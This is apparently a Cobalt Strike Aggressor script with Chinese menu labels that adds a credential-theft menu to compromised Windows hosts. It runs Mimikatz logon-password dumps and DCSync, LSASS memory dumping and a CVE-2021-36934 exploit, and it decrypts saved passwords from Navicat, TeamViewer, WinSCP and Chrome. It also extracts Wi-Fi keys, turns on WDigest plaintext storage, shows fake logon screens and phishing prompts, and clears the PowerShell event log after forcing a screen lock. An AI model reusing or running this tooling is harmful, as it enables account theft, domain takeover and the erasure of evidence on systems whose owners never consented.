include(script_resource("config"));
menu "☆ 凭据获取" {
  menu "Mimikatz 相关" {
    item "Logonpasswords" {
			blog($1, "\c9=========== Logonpasswords ==========");
      $bid = $1['@'];
      bmimikatz($bid, "sekurlsa::logonpasswords");
    }
    
    item "Krbtgt hash" {
			blog($1, "\c9=========== Krbtgt hash ==========");
      $bid = $1['@'];
      $dialog = dialog("Krbtgt NTLM-Hash" , %(domain => "xxx.com" , user => "krbtgt", bid => $bid), &krbtgt);
      dialog_description($dialog, "利用Mimikatz读取Krbtgt账户的NTLM-Hash。");
      drow_text($dialog, "domain", "Domain: ");
      drow_text($dialog, "user", "User: ");
      dbutton_action($dialog, "运行");
      dialog_show($dialog);
    }
    sub krbtgt{
      $domain = $3['domain'];
      $user = $3['user'];
      bmimikatz($bid, "lsadump::dcsync /domain:$domain /user:$user");
    }

    menu "Mimikatz-DCSync" {
      item "指定用户" {
			blog($1, "\c9=========== Mimikatz-DCSync 指定用户 ==========");
        $dialog = dialog("DomainInfo" , %(bid => $1['@'] , domain => "域名" , user => "用户") , lambda({ bdcsync($3["bid"] , $3["domain"] , $3["user"]) }));
        dialog_description($dialog,"使用Mimikatz去获取指定用户的密码Hash");
        drow_text($dialog,"bid","Bid:");
        drow_text($dialog,"domain","Domain:");
        drow_text($dialog,"user","User:");
        dbutton_action($dialog,"Exploit");
        dialog_show($dialog);
      }
      item "全部用户" {
			blog($1, "\c9=========== Mimikatz-DCSync 全部用户 ==========");
        $dialog = dialog("DomainInfo", %(bid => $1['@'] , domain => "域名") , lambda({ bdcsync($3["bid"] , $3["domain"])}));
        dialog_description($dialog, "获取全部用户的密码Hash");
        drow_text($dialog, "domain","Domain:");
        dbutton_action($dialog,"Exploit");
        dialog_show($dialog);

      }
    }
    item "Mimikatz WDigest Credentials" {
			blog($1, "\c9=========== Mimikatz WDigest Credentials ==========");
      local('$bid');
        foreach $bid ($1){
          wdigest($bid);
        }
    }    
    item "Mimikatz Kerberos Credentials" {
			blog($1, "\c9=========== Mimikatz Kerberos Credentials ==========");
      local('$bid');
        foreach $bid ($1){
          kerberos($bid);
        }
    }
    item "Mimikatz MSV LM & NTLM Passwords" {
			blog($1, "\c9=========== Mimikatz MSV LM & NTLM Passwords ==========");
      local('$bid');
        foreach $bid ($1){
          msv($bid);
        }
    }
    item "Mimikatz TsPkg Passwords" {
			blog($1, "\c9=========== Mimikatz TsPkg Passwords ==========");
      local('$bid');
        foreach $bid ($1){
          tspkg($bid);
        }
    }
    item "Mimikatz LiveSSP passwords" {
			blog($1, "\c9=========== Mimikatz LiveSSP passwords ==========");
      local('$bid');
        foreach $bid ($1){
          livessp($bid);
        }
    }
    item "Mimikatz SSP passwords" {
			blog($1, "\c9=========== Mimikatz SSP passwords ==========");
      local('$bid');
        foreach $bid ($1){
          ssp($bid);
        }
      }

    item "Mimikatz Dump Trust" {
			blog($1, "\c9=========== Mimikatz Dump Trust ==========");
      local('$bid');
        foreach $bid ($1){
          trust($bid);
        }
    }

    item "Mimikatz Backup Keys" {
			blog($1, "\c9=========== Mimikatz Backup Keys ==========");
      local('$bid');
        foreach $bid ($1){
          backupkeys($bid);
        }
    }

    item "Mimikatz Tickets" {
			blog($1, "\c9=========== Mimikatz Tickets ==========");
      local('$bid');
        foreach $bid ($1){
          tickets($bid);
        }
    }

    item "Mimikatz ekeys" {
			blog($1, "\c9=========== Mimikatz ekeys ==========");
      local('$bid');
        foreach $bid ($1){
          ekeys($bid);
        }
      }

    item "Mimikatz DPAPI" {
			blog($1, "\c9=========== Mimikatz DPAPI ==========");
      local('$bid');
        foreach $bid ($1){
          dpapi($bid);
        }
    }

    item "Mimikatz DPAPI System Secret" {
			blog($1, "\c9=========== Mimikatz DPAPI System Secret ==========");
      local('$bid');
        foreach $bid ($1){
          dpapisystem($bid);
        }
    }

    item "Mimikatz Credential Manager" {
			blog($1, "\c9=========== Mimikatz Credential Manager ==========");
      local('$bid');
        foreach $bid ($1){
          credman($bid);
        }
    }
    sub wdigest{
      bmimikatz($1, "sekurlsa::wdigest");
    }
    sub kerberos{
      bmimikatz($1, "sekurlsa::kerberos");
    }
    sub msv{
      bmimikatz($1, "sekurlsa::msv");
    }
    sub tspkg{
      bmimikatz($1, "sekurlsa::tspkg");
    }
    sub livessp{
      bmimikatz($1, "sekurlsa::livessp");
    }
    sub ssp{
      bmimikatz($1, "sekurlsa::ssp");
    }
    sub trust{
      bmimikatz($1, "sekurlsa::trust");
    }
    sub backupkeys{
      bmimikatz($1, "sekurlsa::backupkeys");
    }
    sub tickets{
      bmimikatz($1, "sekurlsa::tickets");
    }
    sub ekeys{
      bmimikatz($1, "sekurlsa::ekeys");
    }
    sub dpapi{
      bmimikatz($1, "sekurlsa::dpapi");
    }
    sub dpapisystem{
      bmimikatz($1, "sekurlsa::dpapi");
    }
    sub credman{
      bmimikatz($1, "sekurlsa::credman");
    }    
  }

  menu "DumpHash 相关" {
    item "SharpMimidump（远程读取.dmp）" {
        blog($1, "\c9=========== SharpMimidump（远程读取.dmp） =========="); # https://github.com/cube0x0/Mimidump
      btask($bid, "使用 Mimidump 远程读取转储的 C:\\Windows\\Temp\\1.dmp（.net 4.5）");
      bexecute_assembly($1, script_resource('/scripts/PassCapture/Minidump.exe') ,"C:\\Windows\\Temp\\1.dmp");
    }
    item "Internal-Monologue" {
        blog($1, "\c9=========== Internal-Monologue ==========");# 参考 https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D
      local('$bid');
          foreach $bid ($1){
          internal_monologue($bid);
          }
    }
    sub internal_monologue{
      $binary = script_resource("/scripts/PassCapture/InternalMonologue.exe");
      $help = "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS";
      beacon_command_register("lazagne", $help, "Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help");
      if(!-exists $binary)
      {
        berror($1, "InternalMonologue binary cannot be found at $binary");
        return;
      }
      $args = "-Downgrade True -Verbose True";
      bexecute_assembly($1, $binary, $args);
    }  
    item "DumpLsassMemory"{
        $dialog = dialog("DumpLsassMemory",%(bid => $1["@"] , pid => "1024") ,&DumpLsassMemorys);
      dialog_description($dialog,"请输入Lsass's pid");
      drow_text($dialog,"pid","pid:");
      dbutton_action($dialog,"Exploit");
      dialog_show($dialog);
    }
    sub DumpLsassMemorys{
        $binary = script_resource("/scripts/PassCapture/MiniDumpLsass.exe");
        bexecute_assembly($3["bid"],$binary,$3['pid']);
    }

    item "CVE-2021-36934"{
      $binary = script_resource("/scripts/PassCapture/CVE-2021-36934.exe");
      bexecute_assembly($1["@"],$binary);
    }
  }  
  separator();

  item "HackBrowserData" {
    blog($1, "\c9=========== 运行HackBrowserData(结果在temp路径下) ==========");
    $exe = script_resource("/scripts/DInvoke.exe");
    $param = "--url " . $url . "/PassCapture/x64/HackBrowserData.jpg";
    bexecute_assembly!($bid, $exe, $param);
  }

  menu "主机程序相关密码" {
    item "SunFlower(查询注册表键值)" {
      blog($1, "\c9=========== SunFlower(查询注册表键值) ==========");
      bshell!($1, "reg query HKEY_USERS\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginInfo || reg query HKEY_USERS\\.DEFAULT\\Software\\Oray\\SunLogin\\SunloginClient\\SunloginGreenInfo || echo 旧版向日葵 C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini && echo 绿色便携版 C:\\ProgramData\\Oray\\SunloginClient\\config.ini");
    }
    item "SharpCloud(获取云凭证)" {
			blog($1, "\c9=========== SharpCloud(获取云凭证) ==========");
      $bid = $1['@'];
      $dialog = dialog("获取云凭证", %(bid => $bid), &SharpCloud);
      dialog_description($dialog, "用于检查是否存在与AWS，Microsoft Azure和Google Compute相关的凭证文件。项目地址：https://github.com/chrismaddalena/SharpCloud");
      drow_combobox($dialog, "type", "type:", @("all","aws","azure","gcloud"));
      dbutton_action($dialog, "运行");
      dialog_show($dialog);
    }
    sub SharpCloud {
      $arg = join(' ',  @($3['type']));
      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpCloud.exe"), $arg);
    }
    
    item "Navicat-Password" {
			blog($1, "\c9=========== Navicat-Password ==========");
      local('$bid');
          foreach $bid ($1){
          navicat_password($bid);
          }
    }
    sub navicat_password{
      $binary = script_resource("/scripts/PassCapture/navicatpwd.exe");
      $help = "Automatic access to Navicat connection information and password";
      beacon_command_register("navicat", $help, "Use: navicat <Automatically export all and decrypt>\nnavicat 12 <Decrypt with 12 algorithms> OR navicat 15057D7BA390\nnavicat 15057D7BA390 12<Decrypt the password of parameter one with 12 algorithm>\n\n$help");
      if(!-exists $binary)
      {
        berror($1, "Navicat binary cannot be found at $binary");
        return;
      }
      bexecute_assembly($1, $binary);
    }

    menu "SharpDecryptPwd(from uknowsec)" {
      item "SharpDecryptPwd" {
			blog($1, "\c9=========== SharpDecryptPwd ==========");
        $bid = $1['@'];
        $dialog = dialog("SharpDecryptPwd", %(type => "-NavicatCrypto",bid => $bid), &SharpDecryptPwd);
        dialog_description($dialog,"对密码已保存在Windwos系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)。项目地址：https://github.com/uknowsec/SharpDecryptPwd");
        drow_combobox($dialog, "type", "Type:", @("-NavicatCrypto", "-TeamViewer", "-FileZilla","-WinSCP"));
        dbutton_action($dialog, "运行");
        dialog_show($dialog);
      }
      item "Xmangager" {
			blog($1, "\c9=========== Xmangager ==========");
        $bid = $1['@'];
        $dialog = dialog("Xmangager", %(type => "-Xmangager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Xmangager);
        dialog_description($dialog, "Xmangager系列产品，如：Xshell,Xftp。");
        drow_combobox($dialog, "type", "Type:", @("-Xmangager"));
        drow_text($dialog, "path", "Sessions Path:  ");
        dbutton_action($dialog, "运行");
        dialog_show($dialog);
      }
    }
    sub SharpDecryptPwd {
      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpDecryptPwd.exe"), $3['type']);
    }
    sub Xmangager {
      $arg = join(' ', @($3['type'],"-p",$3['path']));
      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpDecryptPwd.exe"), $arg);
    }

    menu "SharpDecryptPwd(from RcoIl)" {
      item "SharpDecryptPwd40" {
			blog($1, "\c9=========== SharpDecryptPwd40 ==========");
        $bid = $1['@'];
        $dialog = dialog("SharpDecryptPwd40", %(type => "-Navicat",bid => $bid), &SharpDecryptPwd40);
        dialog_description($dialog,"目前支持 Navicat 系列、Xmanager 系列、TeamViewer、FileZilla 客户端、Foxmail、RealVNC 服务端、TortoiseSVN、WinSCP、Chrome 全版本。项目地址：https://github.com/RcoIl/SharpDecryptPwd");
        drow_combobox($dialog, "type", "Type:", @("-Navicat", "-TeamViewer", "-FileZilla","-WinSCP","-Foxmail","-RealVNC","-TortoiseSVN","-Chrome"));
        dbutton_action($dialog, "运行");
        dialog_show($dialog);
      }
      item "Xmangager40" {
			blog($1, "\c9=========== Xmangager40 ==========");
        $bid = $1['@'];
        $dialog = dialog("Xmangager", %(type => "-Xmanager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &Xmangager40);
        dialog_description($dialog, "Xmangager系列产品，如：Xshell,Xftp。");
        drow_combobox($dialog, "type", "Type:", @("-Xmanager"));
        drow_text($dialog, "path", "Sessions Path:  ");
        dbutton_action($dialog, "运行");
        dialog_show($dialog);
      }
    }
    sub SharpDecryptPwd40 {
      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpDecryptPwd40.exe"), $3['type']);
    }
    sub Xmangager40 {
      $arg = join(' ', @($3['type'],"-p",$3['path']));
      bexecute_assembly($bid, script_resource("/scripts/PassCapture/SharpDecryptPwd40.exe"), $arg);
    }
  }
  item "Net-GPPPassword" {
			blog($1, "\c9=========== Net-GPPPassword (组策略帐户凭据) ==========");
    blog($1, ".NET实现的Get-GPPPassword。检索通过组策略首选项推送的帐户的明文密码和其他信息。该技术很旧，但是在很早以前创建域的环境中仍然很有用。项目地址：https://github.com/outflanknl/Net-GPPPassword")
    bexecute_assembly($1, script_resource("/scripts/PassCapture/Net-GPPPassword_dotNET_v2.exe"), "");
  }
  menu "探测 WIFI密码" {
    item "获取连接过的 WIFI" {
			blog($1, "\c9=========== 获取连接过的 WIFI ==========");
      local('$bid');
      foreach $bid ($1){
        bshell($1, "netsh wlan show profiles");
      }
    }
    item "获取 WIFI 密码" {
			blog($1, "\c9=========== 获取 WIFI 密码 ==========");
      prompt_text("输入wifi名: ", "", lambda({
        bshell(@ids, "netsh wlan show profile name=\"$1\" key=clear");
      }, @ids => $1));
    }
    item "SharpWifiGrabber (检索Wi-Fi密码)" {
			blog($1, "\c9=========== SharpWifiGrabber (检索Wi-Fi密码) ==========");
      blog($1, "项目地址：https://github.com/r3nhat/SharpWifiGrabber")
      bexecute_assembly($1, script_resource('/scripts/PassCapture/SharpWifiGrabber.exe'), "");
    }
  }

  menu "改注册表 Dump 明文密码" {
    item "显示明文" {
			blog($1, "\c9=========== 显示明文 ==========");
      local('$bid');
      foreach $bid ($1){
        bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
      }
    }
    item "强制锁屏" {
			blog($1, "\c9=========== 强制锁屏 ==========");
      local('$bid');
      foreach $bid ($1){
        blog($1, "正在执行锁屏");
        bpowershell_import($bid, script_resource("/scripts/PassCapture/lock-screen.ps1"));
        bpowerpick($bid,"Lock-WorkStation");
        bshell($bid,"wevtutil cl \"Windows PowerShell\"");
      }
    }
    item "隐藏明文" {
			blog($1, "\c9=========== 隐藏明文 ==========");
      local('$bid');
      foreach $bid ($1){
        bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f");
      }
    }
  }
    
  menu "钓鱼密码窃取" {
    item "FakeTheScreen" {
			blog($1, "\c9=========== FakeTheScreen ==========");
      $dialog = dialog("FakeTheScreen",%(bid => $1["@"] , os => "Win7") ,&FakerScreen);
      dialog_description($dialog,"伪造效果一言难尽 慎用!!! 选择目标主机对应的 Windows 系统： ");
      drow_combobox($dialog,"os","系统:",@("Win7","Win10"));
      dbutton_action($dialog,"Exploit");
      dialog_show($dialog);
    }
    sub FakerScreen {
      if ($3["os"] eq "Win7"){
        bexecute_assembly($3["bid"],script_resource("/scripts/PassCapture/fakelogonscreen_trunk/DOTNET35/FakeLogonScreen.exe"));
      }
      else{
        bexecute_assembly($3["bid"],script_resource("/scripts/PassCapture/fakelogonscreen_trunk/FakeLogonScreen.exe"));
      }
    }

    item "CredPhisher(认证登录框钓鱼)" {
			blog($1, "\c9=========== CredPhisher(认证登录框钓鱼) ==========");
      $bid = $1['@'];
      $dialog = dialog("CredPhisher", %(content => "安全认证",bid => $bid), &CredPhisher);
      dialog_description($dialog, "弹出安全认证登录框，进行钓鱼。windows10测试成功。项目地址：https://github.com/matterpreter/OffensiveCSharp/tree/master/CredPhisher");
      drow_text($dialog, "content", "content:");
      dbutton_action($dialog, "运行");
      dialog_show($dialog);
    }
    sub CredPhisher {
      $arg = join('',@("",$3['content']));
      bexecute_assembly($bid, script_resource("/scripts/PassCapture/CredPhisher.exe"), $arg);
    }
  }


}
